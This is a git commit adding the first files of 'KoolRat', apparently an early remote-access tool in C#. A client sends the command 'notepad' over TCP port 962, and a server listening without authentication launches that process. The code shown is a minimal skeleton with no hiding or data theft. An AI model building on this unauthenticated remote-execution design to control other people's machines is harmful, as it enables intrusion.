aefffd777dd850b26bbcc15edb37a136b5433232
mrkoolaid <mrkoolaid@protonmail.com>
2016-11-03 21:48:12 -0700

    Signed-off-by: mrkoolaid <mrkoolaid@protonmail.com>

---
+++ KoolClient/frmMain.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace KoolClient
+{
+    public partial class frmMain : Form
+    {
+        public byte[] bytes;
+
+        public frmMain()
+        {
+            InitializeComponent();
+        }
+
+        private void frmMain_Load(object sender, EventArgs e)
+        {
+            this.Text = "KoolRat v" + Application.ProductVersion;
+        }
+
+        private void btnConnect_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                IPHostEntry ipHost = Dns.Resolve(Dns.GetHostName());
+                IPAddress ip = ipHost.AddressList[0];
+                IPEndPoint remote = new IPEndPoint(ip, 962);
+
+                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
+                try
+                {
+                    sock.Connect(remote);
+
+                    byte[] msg = Encoding.ASCII.GetBytes("notepad" + Environment.NewLine);
+                    int bytesSent = sock.Send(msg);
+
+                    sock.Shutdown(SocketShutdown.Both);
+                    sock.Close();
+
+                }
+                catch (SocketException sex)
+                {
+                    MessageBox.Show(sex.Message, "Socket Exception");
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, "Gneral Exception");
+                }
+            }
+            catch (SocketException sex)
+            {
+                MessageBox.Show(sex.Message, "Socket Error");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "General Exception");
+            }
+        }
+    }
+}
---
+++ KoolServer/Program.cs
@@ -0,0 +1,78 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace KoolServer
+{
+    class Program
+    {
+        public static string data = string.Empty;
+
+        static void Main(string[] args)
+        {
+            listen();
+        }
+
+        static void listen()
+        {
+            byte[] bytes;
+            
+            IPHostEntry ipHost = Dns.Resolve(Dns.GetHostName());
+            IPAddress ip = ipHost.AddressList[0];
+            IPEndPoint endPoint = new IPEndPoint(ip, 962);
+            Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            
+            try
+            {
+                Console.WriteLine("Listening for connections...");
+
+                listener.Bind(endPoint);
+                listener.Listen(1);
+
+                while (null == null)
+                {
+                    Socket sockHandler = listener.Accept();
+                    data = string.Empty;
+
+                    while (true)
+                    {
+                        bytes = new byte[1024];
+                        int incomingBytes = sockHandler.Receive(bytes);
+                        data = Encoding.ASCII.GetString(bytes);
+
+                        if(data.IndexOf(Environment.NewLine) > -1)
+                        {
+                            char[] trims = { '\r', '\0', '\n' };
+                            data = data.Trim(trims);
+                            switch(data)
+                            {
+                                case "notepad":
+                                    Process.Start("notepad");
+                                    break;
+                            }
+                            break;
+                        }
+                    }
+
+                    Console.WriteLine(data);
+                }
+            }
+            catch (SocketException sex)
+            {
+                Console.WriteLine(sex.Message);
+            }
+            catch(Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+
+            Console.Write("Press any key to continue..");
+            Console.ReadKey();
+        }
+    }
+}
